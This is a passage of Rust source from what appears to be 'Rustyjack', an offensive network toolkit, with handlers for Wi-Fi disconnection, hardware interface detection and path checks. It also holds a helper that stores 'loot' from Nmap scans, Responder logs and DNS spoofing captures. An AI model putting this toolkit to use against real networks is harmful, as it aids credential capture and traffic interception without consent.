            log::error!("Failed to delete profile '{}': {e}", args.ssid);
            bail!("Failed to delete profile: {e}");
        }
    }
}

fn handle_wifi_disconnect(args: WifiDisconnectArgs) -> Result<HandlerResult> {
    log::info!("Attempting WiFi disconnect");
    
    let interface = match disconnect_wifi_interface(args.interface.clone()) {
        Ok(iface) => {
            log::info!("Successfully disconnected interface: {iface}");
            iface
        },
        Err(e) => {
            log::error!("Failed to disconnect WiFi: {e}");
            bail!("WiFi disconnect failed: {e}");
        }
    };
    
    let data = json!({ "interface": interface });
    Ok(("Wi-Fi interface disconnected".to_string(), data))
}

fn loot_directory(root: &Path, kind: LootKind) -> PathBuf {
    match kind {
        LootKind::Nmap => root.join("loot").join("Nmap"),
        LootKind::Responder => root.join("Responder").join("logs"),
        LootKind::Dnsspoof => root.join("DNSSpoof").join("captures"),
    }
}

fn loot_kind_label(kind: LootKind) -> &'static str {
    match kind {
        LootKind::Nmap => "nmap",
        LootKind::Responder => "responder",
        LootKind::Dnsspoof => "dnsspoof",
    }
}

fn resolve_loot_path(root: &Path, path: &Path) -> Result<PathBuf> {
    let candidate = if path.is_absolute() {
        path.to_path_buf()
    } else {
        root.join(path)
    };
    let canonical = candidate
        .canonicalize()
        .with_context(|| format!("resolving {}", path.display()))?;
    if !canonical.starts_with(root) {
        bail!("Path {} is outside the Rustyjack root", canonical.display());
    }
    Ok(canonical)
}

fn handle_hardware_detect() -> Result<HandlerResult> {
    log::info!("Scanning hardware interfaces");
    
    let interfaces = list_interface_summaries()?;
    
    // Categorize interfaces
    let mut ethernet_ports = Vec::new();
    let mut wifi_modules = Vec::new();
    let mut other_interfaces = Vec::new();
    
    for iface in &interfaces {
        // Skip loopback
        if iface.name == "lo" {
            continue;
        }
        
        match iface.kind.as_str() {
            "wireless" => wifi_modules.push(iface.clone()),
            "wired" => {
                // Only count ethernet if it's eth* or en*
                if iface.name.starts_with("eth") || iface.name.starts_with("en") {
                    ethernet_ports.push(iface.clone());
                } else {
                    other_interfaces.push(iface.clone());
                }
            }
            _ => other_interfaces.push(iface.clone()),
        }
    }
    
    let data = json!({
        "ethernet_count": ethernet_ports.len(),
        "wifi_count": wifi_modules.len(),
        "other_count": other_interfaces.len(),
        "ethernet_ports": ethernet_ports,
        "wifi_modules": wifi_modules,
        "other_interfaces": other_interfaces,
        "total_interfaces": interfaces.len() - 1, // Exclude loopback
    });
    
    let summary = format!(
        "Found {} ethernet, {} wifi, {} other",
        ethernet_ports.len(),
        wifi_modules.len(),
        other_interfaces.len()
    );
    
    log::info!("Hardware scan complete: {summary}");
    Ok((summary, data))
}

